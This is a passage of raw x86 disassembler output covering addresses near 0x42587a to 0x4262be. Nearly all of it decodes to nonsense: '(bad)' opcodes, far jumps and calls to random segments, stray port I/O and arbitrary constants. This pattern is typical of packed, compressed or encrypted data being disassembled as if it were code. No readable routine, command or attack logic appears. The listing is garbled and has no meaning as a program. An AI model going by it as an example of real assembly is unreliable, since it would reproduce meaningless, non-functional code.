  42587a:	sub    al,0xfc
  42587c:	mov    ebx,edx
  42587e:	add    edx,DWORD PTR [edi]
  425880:	pusha  
  425881:	inc    ecx
  425882:	(bad)  
  425883:	jmp    0xb8f68753
  425888:	push   ebx
  425889:	jo     0x425901
  42588b:	xchg   esp,eax
  42588c:	or     ebx,DWORD PTR [ebp+0x78]
  42588f:	cs aaa 
	...
  4258f1:	add    BYTE PTR [eax],al
  4258f3:	add    BYTE PTR [edx+edx*2-0x70],bl
  4258f7:	push   edx
  4258f8:	sahf   
  4258f9:	rcr    dh,cl
  4258fb:	pop    esi
  4258fc:	adc    BYTE PTR [edx+0x55],0x71
  425900:	in     eax,dx
  425901:	aaa    
  425902:	fs mov dh,0x88
  425905:	xchg   ecx,eax
  425906:	add    DWORD PTR [eax],eax
  425908:	add    eax,0x9a000001
  42590d:	sub    al,BYTE PTR [ebp-0x50]
  425910:	mov    gs,WORD PTR ds:[ebx]
  425913:	mov    fs,WORD PTR [ebp+0x79]
  425916:	jg     0x4258b3
  425918:	xor    eax,0x93715628
  42591d:	je     0x4258ca
  42591f:	leave  
  425920:	sbb    ebx,ebx
  425922:	aaa    
  425923:	xor    al,0xbb
  425925:	mov    BYTE PTR [edi],cl
  425927:	test   DWORD PTR [esi-0x4b4a04cc],eax
  42592d:	cmp    al,0x9a
  42592f:	xchg   esp,eax
  425930:	(bad)  
  425931:	mov    edi,0x1ddee507
  425936:	(bad)  
  425937:	dec    esi
  425938:	jo     0x4259b8
  42593a:	cmp    BYTE PTR [eax-0x12214609],bl
  425940:	pop    es
  425941:	ret    
  425942:	loop   0x4259a0
  425944:	aam    0xb5
  425946:	into   
  425947:	pop    edi
  425948:	je     0x425927
  42594a:	repz js 0x4259ba
  42594d:	rcr    DWORD PTR [edi-0x732f4fc8],cl
  425953:	mov    eax,0xa290b98e
  425958:	add    eax,0xcb670cbc
  42595d:	jl     0x4258ed
  42595f:	test   eax,0x5c518147
  425964:	imul   ecx,DWORD PTR [eax-0x3e70112d],0xffffffb4
  42596b:	xchg   edx,eax
  42596c:	mov    al,ds:0xf452802a
  425971:	adc    BYTE PTR [edx],al
  425973:	aam    0x7d
  425975:	popa   
  425976:	cwde   
  425977:	sar    BYTE PTR [eax],0xb1
  42597a:	fs mov dh,0x63
  42597d:	fdivrp st(7),st
  42597f:	pushf  
  425980:	cdq    
  425981:	int3   
  425982:	(bad)  
  425983:	mov    cl,0xfb
  425985:	test   BYTE PTR [ebp-0x76e791a7],bh
  42598b:	cmp    eax,0xb07c5215
  425990:	pop    ecx
  425991:	sbb    al,0x80
  425993:	pop    esi
  425994:	stos   DWORD PTR es:[edi],eax
  425995:	sbb    cl,BYTE PTR [esi]
  425997:	xchg   esp,eax
  425998:	xchg   esi,eax
  42599a:	loope  0x425967
  42599c:	push   0x9be749b3
  4259a1:	xor    eax,0x318e9f54
  4259a6:	mov    eax,ds:0x65735455
  4259ab:	xchg   ebx,eax
  4259ac:	sahf   
  4259ad:	add    dl,ch
  4259af:	mov    eax,ds:0x58a7d5c8
  4259b4:	mov    WORD PTR [esi-0x27],cs
  4259b7:	ss dec esi
  4259b9:	int    0x6a
  4259bb:	dec    ecx
  4259bc:	sbb    BYTE PTR [esi+0x10],0xd4
  4259c0:	sub    al,0xc4
  4259c2:	adc    al,0x87
  4259c4:	rcr    DWORD PTR [eax],1
  4259c6:	fistp  QWORD PTR [edi+ebp*8+0x3f64b425]
  4259cd:	jmp    0x425963
  4259cf:	rcl    esi,cl
  4259d1:	mov    ebx,0x9bac5bd0
  4259d6:	xor    BYTE PTR [edx-0x4d],dh
  4259d9:	jmp    0x1611:0x38505c58
  4259e0:	mov    ebp,0xaa2011a4
  4259e5:	mov    dh,0x44
  4259e7:	call   0x7ee4:0x2944e6bb
  4259ee:	xor    bl,BYTE PTR [ecx-0x71be80e6]
  4259f4:	jmp    0x425a0c
  4259f6:	adc    BYTE PTR [edx],bh
  4259f8:	pop    ebp
  4259f9:	stc    
  4259fa:	cwde   
  4259fb:	bound  edi,QWORD PTR [ebx]
  4259fd:	adc    DWORD PTR ds:0x530e7673,0x71
  425a04:	xor    dl,BYTE PTR [esi]
  425a06:	ins    BYTE PTR es:[edi],dx
  425a07:	shl    BYTE PTR [ebx+0x8c160bf],1
  425a0d:	inc    ecx
  425a0e:	mov    esp,0x8d01
	...
  425a73:	add    cl,al
  425a75:	arpl   WORD PTR [edi+eiz*2],ax
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x5b95afa2]
  425a84:	lea    edx,[edx+0x1050001]
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	xchg   BYTE PTR [edx+0x3e],dh
  425a8f:	loop   0x425aa3
  425a91:	push   ecx
  425a92:	fst    DWORD PTR [edx]
  425a94:	sbb    dl,BYTE PTR [ebp+0x17147b8a]
  425a9a:	jmp    0x425b1a
  425a9c:	les    edi,FWORD PTR [edx+0x57ab453e]
  425aa2:	jmp    0x22c:0xd89b437
  425aa9:	loop   0x425a4b
  425aab:	rol    DWORD PTR [ecx-0x3c],0x89
  425aaf:	push   ss
  425ab0:	loope  0x425afa
  425ab2:	aas    
  425ab3:	int3   
  425ab4:	xor    BYTE PTR [edi-0x38],0xc1
  425ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ab9:	and    BYTE PTR [ebp-0x21],al
  425abc:	push   ebx
  425abd:	test   edi,edx
  425abf:	jmp    0x425b14
  425ac1:	cmp    al,0x9c
  425ac3:	or     eax,0x69d41379
  425ac8:	cmp    al,0xc8
  425aca:	loope  0x425aff
  425acc:	dec    esp
  425acd:	aas    
  425ace:	fld    TBYTE PTR [ebp+0x75]
  425ad1:	repnz enter 0xccf1,0xfc
  425ad6:	in     eax,0x75
  425ad8:	cwde   
  425ad9:	repz aas 
  425adb:	adc    ebx,DWORD PTR [eax]
  425add:	clc    
  425ade:	mov    bl,0x46
  425ae0:	pop    esp
  425ae1:	or     dl,BYTE PTR [edx]
  425ae3:	mov    ch,0x41
  425ae5:	mov    al,0xe8
  425ae7:	mov    ebx,0xa5d9bde9
  425aec:	jne    0x425aae
  425aee:	or     DWORD PTR [esi+0x36],edi
  425af1:	cmp    DWORD PTR [ebp-0x74],0xffffffd8
  425af5:	mov    bh,0x2d
  425af7:	fdivr  QWORD PTR [ecx]
  425af9:	cmc    
  425afa:	xchg   ebp,eax
  425afb:	psraw  mm5,QWORD PTR cs:[edx+esi*2-0xe923013]
  425b04:	bound  edx,QWORD PTR [ebx+0x33]
  425b07:	adc    BYTE PTR [edx-0x7bcb4046],ch
  425b0d:	dec    edi
  425b0e:	rcr    BYTE PTR [edi+0x2c],0xd7
  425b12:	fwait
  425b13:	lods   al,BYTE PTR ds:[esi]
  425b14:	xchg   edi,eax
  425b15:	sub    dl,BYTE PTR [eax+0x2a]
  425b18:	cld    
  425b19:	imul   esi,DWORD PTR [ebx+ecx*8-0x31],0x74
  425b1e:	pop    esp
  425b1f:	mov    al,0x52
  425b21:	lahf   
  425b22:	jns    0x425b28
  425b24:	pop    ebp
  425b25:	xor    eax,DWORD PTR [esi]
  425b27:	add    ecx,DWORD PTR [ebx+0x21]
  425b2a:	(bad)  
  425b2b:	mov    ah,0x6d
  425b2d:	nop
  425b2e:	mov    ds:0x94c1943,eax
  425b33:	push   ecx
  425b34:	sub    ch,BYTE PTR [ebx-0x51a33fa2]
  425b3a:	(bad)  
  425b3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b3c:	inc    ebx
  425b3d:	pop    ds
  425b3e:	add    DWORD PTR [ebx],edi
  425b40:	pop    ecx
  425b41:	pop    ds
  425b42:	sbb    edi,DWORD PTR [esi+edi*8]
  425b45:	out    0xcd,al
  425b47:	psubq  mm5,QWORD PTR [edi+0x53386209]
  425b4e:	mov    ds:0x9fb5949e,eax
  425b53:	div    BYTE PTR [edi]
  425b55:	fnop   
  425b57:	or     ecx,DWORD PTR [eax-0x7f]
  425b5a:	ss xchg ecx,eax
  425b5c:	sbb    bl,dl
  425b5e:	scas   al,BYTE PTR es:[edi]
  425b5f:	sbb    al,0xf0
  425b61:	ret    
  425b62:	push   ecx
  425b63:	fsub   st(7),st
  425b65:	scas   eax,DWORD PTR es:[edi]
  425b66:	js     0x425b12
  425b68:	into   
  425b69:	mov    esi,0xfdea0d66
  425b6e:	mov    ebx,0xf240345a
  425b73:	stc    
  425b74:	stos   BYTE PTR es:[edi],al
  425b75:	sti    
  425b76:	push   ebx
  425b77:	inc    esp
  425b78:	test   eax,0xc3c5c07c
  425b7d:	(bad)  
  425b7e:	cdq    
  425b7f:	mov    dl,0x5
  425b81:	into   
  425b82:	dec    eax
  425b83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b84:	cmp    bh,BYTE PTR [ebx-0x67e15fa1]
  425b8a:	xchg   esp,eax
  425b8b:	pop    ds
  425b8c:	adc    DWORD PTR [edi+edi*2+0xb950],0x0
	...
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	xlat   BYTE PTR ds:[ebx]
  425c01:	enter  0xb6ac,0x92
  425c05:	xchg   ebx,eax
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    eax,0x9c000001
  425c0d:	ja     0x425bfb
  425c0f:	mov    al,0x6c
  425c11:	and    edi,DWORD PTR [edi-0x5045a5a3]
  425c17:	(bad)  
  425c18:	(bad)  [ebp+0x53]
  425c1b:	push   edx
  425c1c:	ret    
  425c1d:	arpl   bx,ax
  425c1f:	in     al,0xc8
  425c21:	(bad)  
  425c22:	test   al,0x1a
  425c24:	xchg   ebp,eax
  425c25:	sti    
  425c26:	enter  0xaa0f,0x3a
  425c2a:	adc    eax,0x24c257fd
  425c2f:	(bad)  
  425c30:	(bad)  
  425c31:	call   DWORD PTR [esi+esi*8-0x3f9ddb0e]
  425c38:	mov    edi,0x87546693
  425c3d:	sub    BYTE PTR [edi],cl
  425c3f:	cmp    BYTE PTR [esi-0x7e348146],0x81
  425c46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c47:	ins    DWORD PTR es:[edi],dx
  425c48:	pop    ss
  425c49:	aas    
  425c4a:	ffree  st(1)
  425c4c:	into   
  425c4d:	dec    ebx
  425c4e:	sub    ebp,esi
  425c50:	dec    eax
  425c51:	test   BYTE PTR [eax],ch
  425c53:	mov    ?,WORD PTR ds:[edx+0x32743a48]
  425c5a:	mov    ds:0x493113d9,eax
  425c5f:	int    0x5a
  425c61:	mov    BYTE PTR [ebp+0x60],ch
  425c64:	push   ebp
  425c65:	fist   DWORD PTR [eax-0x75a9c79a]
  425c6b:	mov    eax,ds:0xb1dc9c18
  425c70:	test   eax,0xa2186b13
  425c75:	repz or DWORD PTR [eax],ebx
  425c78:	cmc    
  425c79:	pop    esp
  425c7a:	dec    edi
  425c7b:	std    
  425c7c:	daa    
  425c7d:	stc    
  425c7e:	enter  0xf79a,0xb7
  425c82:	and    ebp,eax
  425c84:	fwait
  425c85:	pop    edi
  425c86:	mov    edx,0xd7d6963a
  425c8b:	call   0x88a7baf1
  425c90:	dec    esp
  425c91:	out    0x51,al
  425c93:	jmp    0x425c42
  425c95:	add    BYTE PTR [edx],al
  425c97:	dec    ecx
  425c98:	push   esp
  425c99:	retf   0xe03c
  425c9c:	jmp    0xa2f5:0x271d6925
  425ca3:	pop    edx
  425ca4:	inc    edx
  425ca5:	or     bh,bh
  425ca7:	adc    al,cl
  425ca9:	mov    eax,ds:0x3fac0a57
  425cae:	mov    al,ds:0xc2551bac
  425cb3:	std    
  425cb4:	dec    eax
  425cb5:	std    
  425cb6:	sti    
  425cb7:	mov    ds,WORD PTR [ebp-0x249a8719]
  425cbd:	jl     0x425cbf
  425cbf:	push   ebp
  425cc0:	cs loopne 0x425cc7
  425cc3:	push   0xffffffef
  425cc5:	adc    eax,0xf605a0e
  425cca:	fsubr  st,st(1)
  425ccc:	and    edx,DWORD PTR [edx+0x7f]
  425ccf:	inc    esp
  425cd0:	fnstsw WORD PTR [ebx-0x220309cb]
  425cd6:	faddp  st(4),st
  425cd8:	retf   
  425cd9:	fldcw  WORD PTR [ebx-0x6ba6c1]
  425cdf:	std    
  425ce0:	sub    ebp,edi
  425ce2:	ds cs popa 
  425ce5:	dec    ebx
  425ce6:	fs pop es
  425ce8:	cmp    BYTE PTR [esi-0x5f8c79cd],bl
  425cee:	dec    eax
  425cef:	ret    0x771c
  425cf2:	sub    ebp,ebx
  425cf4:	pop    ecx
  425cf5:	scas   al,BYTE PTR es:[edi]
  425cf6:	push   esi
  425cf7:	mov    ch,0x2f
  425cf9:	xchg   ebx,eax
  425cfa:	in     eax,0x17
  425cfc:	sbb    al,0xb1
  425cfe:	stos   DWORD PTR es:[edi],eax
  425cff:	iret   
  425d00:	retf   
  425d01:	sub    al,0xea
  425d03:	xor    BYTE PTR [edx-0x36],bh
  425d06:	int3   
  425d07:	arpl   di,bx
  425d09:	xchg   edi,eax
  425d0a:	mov    ch,0xa2
  425d0c:	sbb    eax,0x703a4fdc
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x1486123d,al
  425d84:	xchg   edi,eax
  425d85:	xchg   esp,eax
  425d86:	add    DWORD PTR [eax],eax
  425d88:	add    eax,0x26000001
  425d8d:	jge    0x425d98
  425d8f:	mov    ah,0x8a
  425d91:	and    al,0x6a
  425d93:	cmp    DWORD PTR [edi+0x4f],0xc741bd74
  425d9a:	iret   
  425d9b:	pop    esp
  425d9c:	xchg   DWORD PTR [edx-0x52],ebx
  425d9f:	fwait
  425da0:	out    dx,al
  425da1:	jno    0x425d35
  425da3:	mov    cl,0x7e
  425da5:	loop   0x425d3b
  425da7:	jg     0x425dff
  425da9:	stc    
  425daa:	mov    ah,0x7b
  425dac:	sbb    ah,BYTE PTR [edx-0x5e]
  425daf:	pop    es
  425db0:	fwait
  425db1:	mov    cl,0x1c
  425db3:	jp     0x425dcd
  425db5:	xchg   edx,eax
  425db6:	mov    ch,0x85
  425db8:	mov    edi,DWORD PTR [edx-0x15]
  425dbb:	in     al,dx
  425dbc:	out    dx,eax
  425dbd:	inc    edx
  425dbe:	iret   
  425dbf:	push   ss
  425dc0:	out    0x87,eax
  425dc2:	mov    cl,0x8d
  425dc4:	dec    esp
  425dc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425dc6:	(bad)  
  425dc7:	fild   WORD PTR [ebp+0x3c]
  425dca:	loopne 0x425db6
  425dcc:	daa    
  425dcd:	xchg   edx,eax
  425dce:	sbb    eax,0x6ecb4244
  425dd3:	mov    bl,0xc5
  425dd5:	pop    ds
  425dd6:	in     eax,dx
  425dd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425dd8:	push   cs
  425dd9:	fcomi  st,st(5)
  425ddb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ddc:	mov    edi,0x77fc37c8
  425de1:	or     DWORD PTR [edi-0x49869163],esp
  425de7:	push   cs
  425de8:	les    eax,FWORD PTR [ecx]
  425dea:	xchg   BYTE PTR [edi+0x2b],ah
  425ded:	xchg   esi,eax
  425dee:	outs   dx,BYTE PTR ds:[esi]
  425def:	(bad)  
  425df1:	cmp    dh,cl
  425df3:	add    DWORD PTR [esi+0x3d86ed4f],ebx
  425df9:	mov    ds:0x661db056,eax
  425dfe:	icebp  
  425dff:	div    BYTE PTR [eax-0x433c5ae2]
  425e05:	pop    edi
  425e07:	adc    eax,DWORD PTR [edi-0x70b48770]
  425e0d:	cmp    eax,0x8cb59094
  425e12:	retf   0xc673
  425e15:	xor    esp,edi
  425e17:	pop    edx
  425e18:	or     esi,ebp
  425e1a:	inc    esi
  425e1b:	push   0xb453252e
  425e20:	loop   0x425e34
  425e22:	jle    0x425e32
  425e24:	cmp    dh,bh
  425e26:	xchg   edx,eax
  425e27:	pusha  
  425e28:	daa    
  425e29:	lds    ebp,FWORD PTR [ebp-0x53]
  425e2c:	outs   dx,BYTE PTR ds:[esi]
  425e2d:	jmp    0x8de34457
  425e32:	aaa    
  425e33:	clc    
  425e34:	iret   
  425e35:	leave  
  425e36:	add    al,0x10
  425e38:	ror    BYTE PTR [ebp+0x1d],0x8c
  425e3c:	pushf  
  425e3d:	cmp    esp,edx
  425e3f:	cmp    BYTE PTR [ebx],ah
  425e41:	dec    eax
  425e43:	push   ecx
  425e44:	(bad)  
  425e45:	ja     0x425dca
  425e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e48:	jle    0x425e08
  425e4a:	pop    ebx
  425e4b:	mov    bl,0x3c
  425e4d:	loopne 0x425eb1
  425e4f:	sub    eax,0xba13fd0
  425e54:	cmp    al,0x60
  425e56:	pusha  
  425e57:	mov    eax,ds:0x578b1351
  425e5c:	pop    esi
  425e5d:	pop    esp
  425e5e:	das    
  425e5f:	call   0x54da:0x7cfd652b
  425e66:	jb     0x425e31
  425e68:	fwait
  425e69:	mov    ah,BYTE PTR [ecx+esi*4]
  425e6c:	inc    ebx
  425e6d:	xor    al,0x78
  425e6f:	outs   dx,DWORD PTR ds:[esi]
  425e70:	fwait
  425e71:	inc    ecx
  425e72:	mov    ebp,0x4f545ab2
  425e77:	ds out dx,eax
  425e79:	fcom   DWORD PTR [edx]
  425e7b:	xchg   DWORD PTR [edx],eax
  425e7d:	xchg   edi,eax
  425e7e:	pop    edx
  425e7f:	out    0xc0,eax
  425e81:	cmp    al,0xe3
  425e83:	mov    ds:0xcb260f65,al
  425e88:	push   es
  425e89:	xlat   BYTE PTR ds:[ebx]
  425e8a:	add    dl,BYTE PTR [esi+ebp*2+0x46318a21]
	...
  425ef1:	add    BYTE PTR [eax],al
  425ef3:	add    dh,al
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	leave  
  425f01:	xchg   edx,eax
  425f02:	lds    edi,FWORD PTR [ecx]
  425f04:	pushf  
  425f05:	xchg   ebp,eax
  425f06:	add    DWORD PTR [eax],eax
  425f08:	add    eax,0x6b000001
  425f0d:	sub    al,0xab
  425f0f:	adc    DWORD PTR [esi],ebp
  425f11:	cmp    DWORD PTR [ebp-0x550f9076],esi
  425f17:	mov    ch,0x84
  425f19:	out    dx,al
  425f1a:	mov    bh,0x9e
  425f1c:	push   esi
  425f1d:	fcomp  QWORD PTR [edx]
  425f1f:	mov    edi,0x985960e6
  425f24:	or     BYTE PTR [esi+0x5e],al
  425f27:	outs   dx,BYTE PTR ss:[esi]
  425f29:	int    0xd
  425f2b:	cmp    cl,BYTE PTR [edi+0x615f65ad]
  425f31:	mov    al,ds:0x9bba0b01
  425f36:	out    dx,eax
  425f37:	pop    es
  425f38:	mov    edx,0x44f8c0eb
  425f3d:	mov    ecx,0xa0431946
  425f42:	dec    eax
  425f43:	cmp    ebx,DWORD PTR [eax-0x72]
  425f46:	cdq    
  425f47:	gs pop edi
  425f49:	fld    QWORD PTR [edi+0x7d]
  425f4c:	fs int3 
  425f4e:	or     bl,dl
  425f50:	xlat   BYTE PTR ds:[ebx]
  425f51:	jne    0x425f6e
  425f53:	jl     0x425fcb
  425f55:	push   edi
  425f56:	pop    ss
  425f57:	jmp    0x24dd:0x697bcb96
  425f5e:	push   edi
  425f5f:	leave  
  425f60:	fsub   DWORD PTR [eax+ebx*2]
  425f63:	(bad)  
  425f64:	ret    
  425f65:	lods   al,BYTE PTR ds:[esi]
  425f66:	jbe    0x425f9e
  425f68:	ss pusha 
  425f6a:	and    cl,BYTE PTR [ecx+edx*1-0x29eb0aa3]
  425f71:	pop    bp
  425f73:	popa   
  425f74:	fs jno 0x425f3b
  425f77:	sahf   
  425f78:	or     BYTE PTR [esi-0x5e1b56d7],ch
  425f7e:	push   cs
  425f7f:	inc    ecx
  425f80:	into   
  425f81:	scas   al,BYTE PTR es:[edi]
  425f82:	and    DWORD PTR [eax+0x64d4d338],esi
  425f88:	retf   
  425f89:	jb     0x425ff3
  425f8b:	jns    0x425f64
  425f8d:	div    DWORD PTR [esp+esi*4-0x5dd27125]
  425f94:	fimul  WORD PTR [esp+0x6e9ab9e4]
  425f9b:	aaa    
  425f9c:	sub    dh,ch
  425f9e:	pop    ecx
  425f9f:	add    DWORD PTR ds:0x71c3192,eax
  425fa5:	fst    QWORD PTR [eax-0x738d7cbd]
  425fab:	int3   
  425fac:	sbb    al,dl
  425fae:	add    BYTE PTR fs:[ebx],0x61
  425fb2:	mov    cl,0xfc
  425fb4:	hlt    
  425fb5:	fist   DWORD PTR [ebp-0x21f3927f]
  425fbb:	outs   dx,BYTE PTR ds:[esi]
  425fbc:	xlat   BYTE PTR ds:[ebx]
  425fbd:	xchg   esp,eax
  425fbe:	add    DWORD PTR [eax+0x280541b1],esi
  425fc4:	mov    al,ds:0x34602cf2
  425fc9:	and    BYTE PTR [edi+0x10],ah
  425fcc:	add    al,0x7d
  425fce:	fld    QWORD PTR [ebx+0xed48c42]
  425fd4:	call   0x466d:0x5671fa31
  425fdb:	jns    0x425f8c
  425fdd:	das    
  425fde:	push   esi
  425fdf:	fnstenv [edx-0x48d9a64b]
  425fe5:	rcr    DWORD PTR [esi+0x3c],cl
  425fe8:	imul   ebx,edx,0x8ee35413
  425fee:	imul   ebp,ebx,0x0
  425ff1:	add    eax,0xad6ad265
  425ff6:	jp     0x426033
  425ff8:	mov    ch,BYTE PTR [edx-0x5c7c1f10]
  425ffe:	push   ds
  425fff:	loopne 0x426026
  426001:	push   esp
  426002:	mov    DWORD PTR [esi-0x6a],0x95e25ef8
  426009:	fucomi st,st(4)
  42600b:	fsub   st,st(4)
  42600d:	xchg   ebp,eax
  42600e:	mov    eax,ds:0x7efa
	...
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	in     eax,0x60
  426082:	sahf   
  426083:	xor    ah,BYTE PTR [ecx+0x5000196]
  426089:	add    DWORD PTR [eax],eax
  42608b:	add    cl,dl
  42608d:	pushf  
  42608e:	cmc    
  42608f:	sub    DWORD PTR [ebx+0x5b],0x6d
  426093:	dec    esi
  426094:	dec    eax
  426095:	rol    al,0xea
  426098:	mov    edi,0x5a9ee1dc
  42609d:	sub    dh,dh
  42609f:	push   ds
  4260a0:	mov    al,ds:0x3f7964a3
  4260a5:	mov    cs,WORD PTR [eax]
  4260a7:	fsub   DWORD PTR [ebx]
  4260a9:	fwait
  4260aa:	jg     0x426091
  4260ac:	pop    edx
  4260ad:	lods   al,BYTE PTR ds:[esi]
  4260ae:	dec    esi
  4260af:	repz in al,0x6d
  4260b2:	cmp    BYTE PTR ds:0xde15a7a7,0x4d
  4260b9:	fcmovne st,st(3)
  4260bb:	icebp  
  4260bc:	(bad)  
  4260be:	ret    
  4260bf:	imul   eax,DWORD PTR [edi-0x19],0xbcc82700
  4260c6:	inc    edi
  4260c7:	push   esp
  4260c8:	stos   BYTE PTR es:[edi],al
  4260c9:	adc    eax,0x2b651a5c
  4260ce:	fsubrp st(0),st
  4260d0:	push   ss
  4260d1:	pop    eax
  4260d2:	out    0x2d,eax
  4260d4:	(bad)  
  4260d5:	xor    dh,BYTE PTR ss:[edi]
  4260d8:	test   DWORD PTR [eax+0x1daff0b3],ebx
  4260de:	pop    es
  4260df:	mov    eax,0x9d569dca
  4260e4:	(bad)  
  4260e6:	cmp    ebx,DWORD PTR [edx-0x62]
  4260e9:	and    ecx,DWORD PTR [edx]
  4260eb:	mov    ecx,0x431a71df
  4260f0:	movq   mm3,mm4
  4260f3:	stc    
  4260f4:	cmp    eax,0x886a98fb
  4260f9:	or     al,0xe8
  4260fb:	dec    ebx
  4260fc:	test   DWORD PTR [ecx],0xe5261b60
  426102:	jnp    0x4260c5
  426104:	sti    
  426105:	stos   BYTE PTR es:[edi],al
  426106:	add    esi,ebx
  426108:	cmc    
  426109:	mov    ds:0xc481ece2,eax
  42610e:	fwait
  42610f:	and    edx,edx
  426111:	inc    edx
  426112:	jne    0x426190
  426114:	mov    ecx,0x52801229
  426119:	mov    dl,0x36
  42611b:	in     eax,dx
  42611c:	pop    ebx
  42611d:	pop    eax
  42611e:	add    DWORD PTR [ebx-0x1d],0x55339d56
  426125:	push   ecx
  426126:	cmp    esi,DWORD PTR [eax]
  426128:	cmp    al,BYTE PTR [edi-0x54dc978f]
  42612e:	clc    
  42612f:	cli    
  426130:	jmp    0x836f:0x716d3806
  426137:	mov    ecx,0xad4f9ae9
  42613c:	outs   dx,BYTE PTR ds:[esi]
  42613d:	shl    BYTE PTR [ebx],cl
  42613f:	ds aad 0x16
  426142:	xchg   ebx,eax
  426143:	dec    ebp
  426144:	xchg   BYTE PTR [eax+0x7fd38656],dh
  42614a:	lods   eax,DWORD PTR ds:[esi]
  42614b:	shr    DWORD PTR [ebx],1
  42614d:	xor    ah,BYTE PTR [esi+0x43]
  426150:	mov    bl,BYTE PTR [ecx]
  426152:	nop
  426153:	add    eax,0xa25efa4d
  426158:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426159:	cwde   
  42615a:	mov    cl,0x57
  42615c:	daa    
  42615d:	test   eax,0x773ab037
  426162:	(bad)  
  426163:	cwde   
  426164:	cs enter 0xb4d6,0xe0
  426169:	mov    WORD PTR [edx-0x4de8d357],fs
  42616f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426170:	stos   BYTE PTR es:[edi],al
  426171:	leave  
  426172:	pop    ecx
  426173:	aam    0x4d
  426175:	lock sbb ah,al
  426178:	data16 or al,0xe3
  42617b:	mov    cl,0x53
  42617d:	popf   
  42617e:	aas    
  42617f:	imul   ebx,DWORD PTR [eax+0x63],0xe1f15367
  426186:	mov    ds:0xc5ec76e0,eax
  42618b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42618c:	adc    dh,dl
  42618e:	xchg   edx,eax
  42618f:	loopne 0x42619d
	...
  4261f1:	add    BYTE PTR [eax],al
  4261f3:	add    BYTE PTR [ebx-0x409ef0df],bl
  4261f9:	outs   dx,DWORD PTR ds:[esi]
  4261fa:	(bad)  
  4261fb:	sti    
  4261fc:	mov    bh,0x83
  4261fe:	mov    cl,0x27
  426200:	sbb    ebp,edi
  426202:	dec    ebx
  426203:	aas    
  426204:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426205:	xchg   edi,eax
  426206:	add    DWORD PTR [eax],eax
  426208:	add    eax,0x34000001
  42620d:	cmp    dh,ah
  42620f:	jno    0x426216
  426211:	test   al,0x60
  426213:	popf   
  426214:	push   ebp
  426215:	mov    dl,0x84
  426217:	fidiv  WORD PTR [esp+edi*2]
  42621a:	xor    eax,0x1e6f304c
  42621f:	add    eax,0xff941cfe
  426224:	aam    0x3a
  426226:	add    BYTE PTR [eax],0x7f
  426229:	pop    edx
  42622a:	cmp    al,0x2f
  42622c:	cwde   
  42622d:	push   cx
  42622f:	sbb    BYTE PTR [edx+0x69],dh
  426232:	add    ebp,DWORD PTR [eax]
  426234:	pop    edi
  426235:	stos   DWORD PTR es:[edi],eax
  426236:	out    dx,eax
  426237:	mov    ecx,0x1f106c0
  42623c:	lods   eax,DWORD PTR ds:[esi]
  42623d:	dec    eax
  42623e:	jne    0x426262
  426240:	and    BYTE PTR [esi+0x6b8a33f9],dl
  426246:	aad    0x6b
  426248:	fist   WORD PTR [ebx+ebx*8]
  42624b:	mov    ds:0x8f385b3d,eax
  426250:	adc    al,0x7a
  426252:	jne    0x4262a8
  426254:	mov    al,ds:0xc344961a
  426259:	pop    es
  42625a:	push   ebp
  42625b:	inc    ecx
  42625c:	mov    cl,BYTE PTR ds:0x58fd54c0
  426262:	mov    ss,WORD PTR [ecx-0x6]
  426265:	jecxz  0x4261ea
  426267:	daa    
  426268:	sbb    al,0x83
  42626a:	and    al,0xee
  42626c:	clc    
  42626d:	xchg   esp,eax
  42626e:	aas    
  42626f:	fs xor al,0x1
  426272:	push   esi
  426273:	retf   
  426274:	push   DWORD PTR [ebp+0x1dfea066]
  42627a:	mov    BYTE PTR [ecx-0x75ffb5c8],ah
  426280:	pop    edx
  426281:	xchg   ebp,eax
  426282:	shr    BYTE PTR [ebx+0x39b50f0f],cl
  426288:	pop    ebx
  426289:	test   BYTE PTR [ebx+0x10],0x7c
  42628d:	dec    edi
  42628e:	push   0x9
  426290:	retf   0x3cb3
  426293:	aam    0xf9
  426295:	lds    esi,FWORD PTR ds:0x449a32a
  42629b:	mov    ecx,0x7462f546
  4262a0:	in     al,dx
  4262a1:	xchg   edx,eax
  4262a2:	mov    ebx,0x7d75d4ac
  4262a7:	mov    gs,ecx
  4262a9:	sbb    dl,BYTE PTR [esi+0x12]
  4262ac:	push   ebx
  4262ad:	addr16 psubusw mm7,mm2
  4262b1:	dec    ebx
  4262b2:	xchg   edi,eax
  4262b3:	loope  0x4262c9
  4262b5:	jb     0x4262e8
  4262b7:	inc    ecx
  4262b8:	add    BYTE PTR [edx],0x72
  4262bb:	cs xor bl,dl
  4262be:	add    DWORD PTR [ebx+0x1],esp
